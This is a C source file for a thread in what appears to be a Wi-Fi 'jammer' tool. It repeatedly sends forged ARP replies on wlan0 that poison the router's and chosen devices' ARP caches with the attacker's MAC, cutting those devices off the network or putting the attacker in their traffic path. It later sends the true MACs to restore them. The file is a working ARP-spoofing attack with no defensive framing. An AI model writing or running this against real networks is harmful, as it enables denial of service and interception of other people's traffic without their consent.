#include "./process/jammer.h"
#include "./network.h"
#include "./arp.h"

#include <pthread.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>

#include <arpa/inet.h>

void *jam_jammed_devices(void *arg) {
    JammerArgs *args = (JammerArgs *)arg;
    Network *network = args->network;
    volatile bool *stop_flag = args->stop_flag;

    int sockfd = arp_create_socket();
    uint8_t my_mac[6];
    get_interface_mac("wlan0", my_mac);

    int cleanup = 3;
    while (cleanup) {
        pthread_mutex_lock(&network->lock);
        Device *router = &network->devices[0];
        uint32_t router_ip = htonl(router->ip);

        for (size_t i = 1; i < network->device_count; i++) {
            Device *device = &network->devices[i];
            DeviceStatus status = device->status;
            if (status == JAMMING) {
                uint32_t device_ip = htonl(device->ip);

                arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
                arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
            } else if (status == DISCONNECTING) {
                uint32_t device_ip = htonl(device->ip);

                arp_send_reply(sockfd, "wlan0", device->mac, &device_ip, router->mac, &router_ip);
                arp_send_reply(sockfd, "wlan0", router->mac, &router_ip, device->mac, &device_ip);

                if (device->disconnecting_counter++ > 4) {
                    device->status = INACTIVE;
                    device->disconnecting_counter = 0;
                }
            }
        }
        if (*stop_flag) {
            if (network_count_inactive(*network) == network->device_count) {
                break;
            }
            cleanup--;
        }
        pthread_mutex_unlock(&network->lock);

        sleep(2);
    }
    close(sockfd);
    return NULL;
}
